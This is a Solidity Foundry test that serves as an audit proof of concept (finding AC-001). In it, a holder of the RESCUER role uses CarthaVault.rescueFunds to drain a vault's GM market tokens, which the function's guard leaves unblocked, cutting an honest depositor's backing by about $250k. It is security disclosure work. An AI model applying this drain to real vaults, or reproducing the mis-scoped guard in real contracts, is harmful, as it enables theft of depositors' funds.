// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UpgradeableBeacon} from "openzeppelin-contracts/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {CarthaVaultFactory} from "../../src/CarthaVaultFactory.sol";
import {CarthaVault} from "../../src/CarthaVault.sol";
import {CarthaParentVault} from "../../src/CarthaParentVault.sol";
import {Diamond} from "../../src/diamond/Diamond.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockExchangeRouter} from "../mocks/MockExchangeRouter.sol";
import {Mock0xMReader} from "../mocks/Mock0xMReader.sol";
import {Mock0xMOracle} from "../mocks/Mock0xMOracle.sol";
import {I0xMReader} from "../../src/interfaces/I0xMReader.sol";
import {DiamondTestUtils} from "../utils/DiamondTestUtils.sol";
import {ICarthaVaultFactory} from "../../src/interfaces/ICarthaVaultFactory.sol";
import {ICarthaVault} from "../../src/interfaces/ICarthaVault.sol";
import {ICarthaParentVault} from "../../src/interfaces/ICarthaParentVault.sol";
import {ICarthaAccessControl} from "../../src/interfaces/ICarthaAccessControl.sol";
import {Roles} from "../../src/diamond/Roles.sol";

/**
 * @title PoC — AC-001 : RESCUER drains the GM marketToken/poolToken (deployed vault value) via rescueFunds
 *
 * @notice CarthaVault.rescueFunds (CarthaVault.sol:617-626) is gated by Roles.RESCUER and blocks a
 *         transfer ONLY when `token == $.asset` (the 6-dec USDC accounting asset). But the vault's
 *         actual value lives in OTHER tokens: $.marketToken / $.poolToken (the GM market token minted
 *         when deployToPool sends USDC into the 0xM deposit vault). Those are NOT on the block-list, so
 *         a RESCUER can call rescueFunds(marketToken, attacker, fullBalance) and transfer the entire
 *         GM-deployed position out of the vault. This (a) removes the real value backing user shares
 *         and (b) deflates _gmValueInUsdc -> _totalValueLocked, lowering sharePrice and every
 *         subsequent _convertToAssets payout (release / forceExit / processQueuedWithdrawals) for
 *         honest lockers. The developer clearly intended rescueFunds to NOT touch vault value (it
 *         blocks the USDC asset), but the value-bearing GM tokens are left fully rescuable: a
 *         mis-scoped guard, not a generic "trusted role can do anything".
 */
contract PoC_RescuerDrainsGM_AC001 is Test {
    CarthaVaultFactory factory;
    ICarthaParentVault parentVault;
    ICarthaVault childA; // plain idle-USDC child
    ICarthaVault childB; // 0xM-deployed child that holds GM — the rescuable value
    MockERC20 usdc;
    MockERC20 gmToken;
    MockExchangeRouter exchangeRouter;
    Mock0xMReader reader;
    Mock0xMOracle oracle;
    Diamond diamond;
    ICarthaAccessControl accessControl;

    address admin = address(0x1);
    address keeperBot = address(0x2);
    address incumbent = address(0x1001); // honest LP whose principal is backed by the GM position
    address attacker = address(0xBAD); // a compromised / malicious holder of the RESCUER role

    bytes32 categoryMetals = keccak256("metals");
    bytes32 poolIdGold = keccak256("XAU/USD");
    bytes32 poolIdSilver = keccak256("XAG/USD");
    uint64 constant LOCK_DAYS = 30;

    function setUp() public {
        vm.startPrank(admin);

        (diamond, accessControl) = DiamondTestUtils.deployDiamond(admin);
        accessControl.grantRole(Roles.FACTORY, admin);
        accessControl.grantRole(Roles.KEEPER_BOT, keeperBot);
        accessControl.grantRole(Roles.ADMIN, admin);

        CarthaVault childVaultImpl = new CarthaVault();
        UpgradeableBeacon childBeacon = new UpgradeableBeacon(address(childVaultImpl), admin);
        CarthaParentVault parentVaultImpl = new CarthaParentVault();
        UpgradeableBeacon parentBeacon = new UpgradeableBeacon(address(parentVaultImpl), admin);
        CarthaVaultFactory factoryImpl = new CarthaVaultFactory();
        bytes memory init = abi.encodeWithSelector(
            CarthaVaultFactory.initialize.selector, address(childBeacon), address(parentBeacon), address(diamond)
        );
        factory = CarthaVaultFactory(address(new ERC1967Proxy(address(factoryImpl), init)));

        usdc = new MockERC20("USD Coin", "USDC", 6);
        gmToken = new MockERC20("GM XAG/USD", "GM", 18);
        exchangeRouter = new MockExchangeRouter(address(gmToken));
        reader = new Mock0xMReader();
        oracle = new Mock0xMOracle();

        address aAddr = factory.deployVault(
            ICarthaVaultFactory.VaultConfig({asset: address(usdc), poolId: poolIdGold, name: "cvA", symbol: "cvA"})
        );
        address bAddr = factory.deployVault(
            ICarthaVaultFactory.VaultConfig({asset: address(usdc), poolId: poolIdSilver, name: "cvB", symbol: "cvB"})
        );
        childA = ICarthaVault(aAddr);
        childB = ICarthaVault(bAddr);

        address parentAddr = factory.deployParentVault(
            ICarthaVaultFactory.ParentVaultConfig({
                asset: address(usdc),
                category: categoryMetals,
                name: "Cartha Metals Vault",
                symbol: "cvMETALS"
            })
        );
        parentVault = ICarthaParentVault(parentAddr);

        accessControl.grantRole(Roles.ADMIN, address(factory));
        factory.addChildToParent(address(parentVault), address(childA), 50, 7000);
        factory.addChildToParent(address(parentVault), address(childB), 50, 7000);
        accessControl.grantRole(Roles.KEEPER_BOT, address(parentVault));
        CarthaParentVault(address(parentVault)).setParentMinimumLockAmount(1);

        // Wire child B for 0xM, GM valued CORRECTLY (1:1 mint + 1e30 reader price).
        childB.setPoolToken(address(gmToken));
        childB.setMarketToken(address(gmToken));
        childB.setExchangeRouter(address(exchangeRouter));
        childB.setDepositVault(address(gmToken));
        childB.setWithdrawalVault(address(gmToken));
        CarthaVault(address(childB)).setReader(address(reader));
        CarthaVault(address(childB)).setDataStore(address(0xDA7A));
        CarthaVault(address(childB)).setOracle(address(oracle));
        reader.setMarket(
            I0xMReader.MarketProps({
                marketToken: address(gmToken),
                indexToken: address(0xB7C),
                longToken: address(usdc),
                shortToken: address(usdc)
            })
        );
        reader.setMarketTokenPrice(int256(1e30));
        oracle.setPrice(address(0xB7C), 1e30, 1e30);
        oracle.setPrice(address(usdc), 1e30, 1e30);

        vm.stopPrank();
    }

    function _fund(address u, uint256 amt) internal {
        usdc.mint(u, amt);
        vm.prank(u);
        usdc.approve(address(parentVault), type(uint256).max);
    }

    // Pro-rata USDC value backing the incumbent's parent shares.
    function _incumbentClaimUsd() internal view returns (uint256) {
        uint256 shares = IERC20(address(parentVault)).balanceOf(incumbent);
        uint256 supply = IERC20(address(parentVault)).totalSupply();
        if (supply == 0) return 0;
        return (parentVault.totalAssets() * shares) / supply;
    }

    function test_RescuerDrainsGM_DeflatesTVL_UnderpaysLockers() public {
        // 1) Incumbent LP locks $1,000,000 -> $500k to each child.
        _fund(incumbent, 1_000_000e6);
        vm.prank(incumbent);
        parentVault.depositAndLockSpread(1_000_000e6, LOCK_DAYS);

        // 2) Keeper deploys $250k of child B's idle USDC into the 0xM pool -> child B HOLDS GM.
        vm.prank(keeperBot);
        bytes32 key = childB.deployToPool(250_000e6, 0);
        exchangeRouter.executeDeposit(key, address(usdc));
        uint256 gmHeld = gmToken.balanceOf(address(childB));
        assertGt(gmHeld, 0, "child B holds GM (the deployed reserve)");

        // 3) BASELINE: child B's value = idle USDC + GM; the incumbent's principal is fully backed.
        uint256 childBTVL_before = childB.totalValueLocked();
        uint256 parentTVL_before = parentVault.totalAssets();
        uint256 claim_before = _incumbentClaimUsd();
        assertApproxEqAbs(childBTVL_before, 500_000e6, 10, "child B TVL ~= $500k (250k idle + 250k GM)");
        assertApproxEqAbs(parentTVL_before, 1_000_000e6, 10, "parent TVL ~= $1,000,000");
        console2.log("child B TVL before        :", childBTVL_before);
        console2.log("parent TVL before         :", parentTVL_before);
        console2.log("incumbent claim($) before :", claim_before);
        console2.log("attacker GM before        :", gmToken.balanceOf(attacker));

        // 4) The RESCUER role (intended for emergency recovery of STRAY tokens) is compromised/malicious.
        vm.prank(admin);
        accessControl.grantRole(Roles.RESCUER, attacker);

        // 4a) NEGATIVE CONTROL — the guard DOES protect the USDC asset (proving intent to protect value).
        vm.prank(attacker);
        vm.expectRevert(); // CannotRescueVaultAsset
        CarthaVault(address(childB)).rescueFunds(address(usdc), attacker, 1);

        // 4b) THE BUG — but the value-bearing GM marketToken is NOT on the block-list, so it drains.
        vm.prank(attacker);
        CarthaVault(address(childB)).rescueFunds(address(gmToken), attacker, gmHeld);

        // 5) AFTER: the entire GM reserve is now the attacker's, and the vault's accounting collapses.
        assertEq(gmToken.balanceOf(attacker), gmHeld, "attacker received the entire GM position");
        assertEq(gmToken.balanceOf(address(childB)), 0, "child B's GM reserve is gone");

        uint256 childBTVL_after = childB.totalValueLocked();
        uint256 parentTVL_after = parentVault.totalAssets();
        uint256 claim_after = _incumbentClaimUsd();
        console2.log("child B TVL after         :", childBTVL_after);
        console2.log("parent TVL after          :", parentTVL_after);
        console2.log("incumbent claim($) after  :", claim_after);
        console2.log("attacker GM after         :", gmToken.balanceOf(attacker));

        // child B TVL deflated by the full GM value (~$250k); parent TVL by the same.
        assertApproxEqAbs(childBTVL_after, 250_000e6, 10, "child B TVL collapsed to idle USDC only (~$250k)");
        assertApproxEqAbs(parentTVL_after, 750_000e6, 10, "parent TVL deflated by the stolen GM (~$750k)");

        // The honest incumbent's principal backing dropped ~$250k — direct, permanent loss.
        assertLt(claim_after, claim_before, "incumbent's redeemable value strictly decreased");
        assertApproxEqAbs(claim_before - claim_after, 250_000e6, 1_000, "incumbent lost ~$250k of backing");
        console2.log("incumbent principal lost  :", claim_before - claim_after);
    }
}
